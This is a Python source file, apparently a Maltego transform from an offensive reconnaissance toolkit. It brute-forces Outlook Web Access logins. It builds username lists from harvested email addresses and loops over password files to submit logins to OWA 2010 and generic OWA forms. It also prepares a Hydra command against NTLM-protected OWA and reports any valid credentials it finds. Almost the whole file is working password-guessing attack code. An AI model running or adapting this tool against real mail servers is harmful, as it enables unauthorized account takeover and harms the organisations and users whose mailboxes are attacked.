import easygui as eg
import os
from MaltegoTransform import *
from TeethLib import *
from urlparse import *
from BeautifulSoup import BeautifulSoup
import urllib,urllib2,cookielib


#####
def TestSingleOWA2010(target,username,password):

 cj = cookielib.CookieJar()
 h=urllib2.HTTPSHandler(debuglevel=0) 
 opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj),h)
 opener.addheaders.append(('Cookie', 'PBack=0'))
 urllib2.install_opener(opener)
 
 params={'destination':'https://'+target+'/owa/','forcedownlevel':'0','flags':'0','trusted':'0','username':username,'password':password,'isUtf8':'1'}
 pdata = urllib.urlencode(params)
 url="https://"+target+"/owa/auth.owa"
 data = urllib2.urlopen(url,pdata).read()
 if data.find('Inbox')>0:
  return 1
 else:
  return 0 


#####
def OWA_2010_Wrap(m,target):
 uloc=read_from_config('OWABrute','TempEmailFile')+target
 logger.debug("Reading usernames from file [%s]"%uloc)
 ulist=slurp_file_plain(uloc).split('\n')
 plist=slurp_file('OWABrute','PasswordsFile')
 
 for p in plist:
  for u in ulist:
   if len(u)>0:
    logger.info("Testing u[%s] p[%s] on [%s]..."%(u,p,target))
    response=TestSingleOWA2010(target,u,p)
    if response==1:
     logger.info("Wrapper found valid credentials on [%s]: u[%s] p[%s]"%(target,u,p))
     HE=m.addEntity("maltego.Phrase","[%s]: u[%s] p[%s]"%(target,u,p))


########
def BruteOWAWeb(target,username,password):

 incorrect_strings=['try again','incorrect','not valid','not authorized','do not have the permissions','replacecurrent=1&reason=2']
 # Browser
 br = mechanize.Browser()
 cj = cookielib.LWPCookieJar()
 br.set_cookiejar(cj)
 br.set_handle_equiv(True)
 br.set_handle_redirect(True)
 br.set_handle_referer(True)
 br.set_handle_robots(False)
 
 # Follows refresh 0 but not hangs on refresh > 0
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=3)
 br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

 html=""
 try:
   r = br.open(target)
   html = r.read()
 except:
   logger.info(target+": could not connect to interface!")
   return m
   
 #check forms
 nof=0
 for f in br.forms():
  nof=nof+1
 
 if nof == 0:
  logger.debug("Could not get a form on [%s], could be Javascript for form or redirect"%target)
  return m
     
 #almost always a single form    
 br.form = list(br.forms())[0] 

 #defaults
 usernamecontrol="username"
 passwordcontrol="password"
 
 for control in br.form.controls:
   if control.type=='text' and control.name.lower().find('username')>=0:
    usernamecontrol=control.name
   if control.type=='password' and control.name.lower().find('password')>=0:
    passwordcontrol=control.name
          
 logger.debug("Using controls [%s] and [%s]"%(usernamecontrol,passwordcontrol))
 
 #set controls
 br.form[usernamecontrol]=username
 br.form[passwordcontrol]=password

 logger.info("Testing u[%s] p[%s] on [%s]..."%(username,password,target))
 br.submit()
 
 html=br.response().read()
 
 
 logged_in=1
 for resp in incorrect_strings:
  if html.lower().find(resp)>0 or len(html)<=0:
      logger.debug("Sorry - we found [%s] in the form"%resp)
      logged_in=0
      return 0

 if logged_in==1:    
      logger.debug("Did not hit failed string. Here is the HTML\n<<<[%s]>>>>\n"%html)
      return 1
 
 return 0      
 
######### 
def OWA_Form_Wrap(m,target,loc):
 uloc=read_from_config('OWABrute','TempEmailFile')+target
 logger.debug("Reading usernames from file [%s]"%uloc)
 ulist=slurp_file_plain(uloc).split('\n')
 plist=slurp_file('OWABrute','PasswordsFile')
 
 for p in plist:
  for u in ulist:
   if len(u)>0:
    response=BruteOWAWeb(loc,u,p)
    if response==1:
     logger.info("Wrapper found valid credentials on [%s]: u[%s] p[%s]"%(target,u,p))
     HE=m.addEntity("maltego.Phrase","[%s]: u[%s] p[%s]"%(target,u,p))
    
   
                                                                                                



#####
def BruteOWA_NTLM(m):
 ufile=read_config_file('OWABrute','TempEmailFile')+target
 pfile=read_config_file('OWABrute','PasswordsFile')
 location=m.getVar('entry')
 additional=read_config_file('OWABrute','HydraOptions')

 hserver=urlparse(location).netloc
 hpath=urlparse(location).path
  
 cmd="hydra %s -L %s -P %s %s https-get %s"%(additional,ufile,pfile,hserver,hpath)
 logger.debug("Running Hydra like so: [%s]"%cmd)
# hydraout=run_external(cmd)
 hydraout=""
 logger.debug("Hydra output is:\n[%s]\n"%hydraout)
 
 if hydraout.find("0 valid passwords found")>0:
  logger.info("Could not find any passwords on NTLM OWA for [%s]",location)
 else:
  HE=m.addEntity("maltego.Phrase","Found passwords!")
  m.returnOutput()
   


#######
def dialog(emails):

 domains=[]
 for email in emails:
  if (email.find('@')>0):
   (front,back)=email.split('@')
   if back not in domains:
    domains.append(back)

 choice=eg.choicebox('Pick a domain','Target selection',domains)
 return choice

   



######### MAIN
m = MaltegoTransform()
m.parseArguments(sys.argv);
target=sys.argv[1]

logger.debug("Starting OWA Brute module")

type=m.getVar('type')
entry=m.getVar('entry')

if type is None:
 logger.debug("Missing type on [%s]"%target)
 m.returOutput()
 quit()
    
location=m.getVar('entry')
if (location is None):
 logger.info("location on [%s] is empty, cannot proceed"%target)
 m.returnOutput()
 quit()

emails=slurp_file("OWABrute","StorageFile") 
if len(emails)<=0:
 logger.info("Storage file empty. You need to run the TTAddToFile transform on email address(es) to populate the file")
 m.returnOutput()
 quit()
 

#---dialog
logger.debug("Popping a dialog for user to decide which emails to us")
choice=""
choice=dialog(emails)
if choice is None:
 logger.debug("You cancelled the dialog. Well done! Bailing!")
 m.returnOutput()
 quit()
logger.debug("User chose [%s]"%choice)

#write the file for the brute force
tempfile=read_config_file('OWABrute','TempEmailFile')+target
try:
 os.remove(tempfile)
except:
 pass 

for email in emails:
 if (email.find('@')>0 and len(email)>0):
  (front,back)=email.split('@')

  
  if back==choice:
   if (read_config_file("OWABrute","KeepDomain")=='true'):
    open(tempfile,"a").write(email+"\n") 
    logger.debug("Writing to [%s] email address [%s]"%(tempfile,email))
   else:
    open(tempfile,"a").write(front+"\n") 
    logger.debug("Writing to [%s] address [%s]"%(tempfile,front))
   

#now we have the email file
logger.debug("OWA type [%s]"%(type))  

if type.find('OWA')>=0 and type.find('NTLM')>=0:
 BruteOWA_NTLM(m)

if type.find('OWA')>=0 and type.find('NTLM')<0:
 
 if type.find('2010')<0:
  OWA_Form_Wrap(m,target,entry)
  
 if type.find('2010')>=0:
   logger.debug("Working with OWA 2010")
   ##bitch to work with, since they redirect in Javascript
   OWA_2010_Wrap(m,target)
  
m.returnOutput()
